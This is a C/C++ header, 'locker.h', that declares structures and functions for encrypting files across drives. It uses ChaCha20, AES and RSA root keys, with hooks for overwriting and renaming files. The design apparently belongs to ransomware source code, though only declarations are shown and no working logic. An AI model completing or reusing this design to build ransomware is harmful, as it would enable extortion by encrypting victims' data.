#ifndef _LOCKER_H_
#define _LOCKER_H_

#ifdef _WIN32

#include <windows.h>

#endif

#include "macro.h"
#include "pathsystem.h"
#include "chacha20/ecrypt-sync.h"
#include "aes/aes256.h"
#include "global_parameters.h"


#ifdef __linux__

#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/bio.h>
#include <openssl/rand.h>


#endif

enum GenPolicy
{
	NONE,
	GENKEY_ONCE,
	GENKEY_EVERY_ONCE
};





typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int* padding, BYTE* buff1, BYTE* buff2, u32 bytes);
typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
typedef BOOL (*EncryptAlgoMethod)(void* FileInfo);
typedef BOOL (*OptionEncryptModeFunc)(void* FileInfo);
typedef TCHAR* (*OptionNameFunc)(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
typedef bool (*OverWriteFunc)(void* CryptInfo, DESC desc_file, unsigned filesize);
typedef bool (*HashSumFunc)(void* hash, DESC desc_file, TCHAR* Filename);


namespace locker
{
	typedef struct HashList
	{
		char* Filename;
		BYTE* hash;
		size_t hash_size;
		SLIST_ENTRY(HashList);
	} *PHLIST, HLIST;

#ifdef _WIN32
	struct descriptor
	{
		BYTE* key_data;
		WCHAR* rsa_path;
		DWORD size;
		BCRYPT_ALG_HANDLE crypto_provider;
		BCRYPT_KEY_HANDLE handle_rsa_key;
	};
#else

	struct descriptor
	{
		BYTE* key_data;
		char* rsa_path;
		unsigned size;
		EVP_PKEY* PKEY;
		BIO* bio;
		EVP_PKEY_CTX* ctx;
	};
#endif


	typedef struct HashData
	{
		SLIST<HLIST>* HashList;
	}*PHASH_DATA, HASH_DATA;

	typedef struct CryptCTXInfo
	{
		VOID* ctx;
		descriptor desc;
		HASH_DATA hash_data;
		CONST CHAR* name;
		u32 mode;
		BYTE* zeros;
		BYTE* random;
		CryptoPolicy method_policy;
		GenPolicy gen_policy;
		EncryptMethodFunc crypt_method;
		EncryptGenKeyFunc gen_key_method;
		EncryptAlgoMethod algo_method;
		OptionEncryptModeFunc mode_method;
		OptionNameFunc name_method;
		OverWriteFunc overwrite_method;
		HashSumFunc hash_sum_method;
	} CRYPT_INFO, * PCRYPT_INFO;

#ifdef _WIN32
	typedef struct file_info
	{
		VOID* ctx;
		PCRYPT_INFO CryptInfo;
		WCHAR* Filename;
		WCHAR* newFilename;
		LPCWSTR FilePath;
		HANDLE FileHandle;
		HANDLE newFileHandle;
		LONGLONG Filesize;
		INT	padding;
	}FILE_INFO, * PFILE_INFO;
#else
	typedef struct file_info
	{
		int dcrypt;
		void* ctx;
		PCRYPT_INFO CryptInfo;
		char* Filename;
		char* newFilename;
		char* FilePath;
		int FileHandle;
		int newFileHandle;
		long long Filesize;
		int padding;
	}FILE_INFO, * PFILE_INFO;
#endif
	typedef struct CryptoSystem
	{
		crypto_aes_ctx	aes_ctx;
		laced_ctx		chacha_ctx;
		CryptCTXInfo	alg[5];
		u32				num;
	}CRYPTO_SYSTEM;

	
	void FreeCryptInfo(CRYPT_INFO* CryptInfo);
	bool GeneratePolicy(CRYPT_INFO* CryptInfo);
	void CryptoSystemInit(CRYPTO_SYSTEM* sys);

	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
	void free_file_info(PFILE_INFO FileInfo, bool success);
	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
	
	void LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
	void LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
	void LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV);
}

typedef locker::HLIST HASH_LIST;
typedef locker::HLIST* PHASH_LIST;
typedef locker::FILE_INFO FILE_INFO;
typedef locker::PFILE_INFO PFILE_INFO;
typedef locker::CryptCTXInfo CRYPT_INFO;
typedef locker::CryptCTXInfo* PCRYPT_INFO;
typedef locker::FILE_INFO FILE_INFO;
typedef locker::CryptoSystem CRYPTO_SYSTEM;
typedef locker::HLIST HLIST;



#endif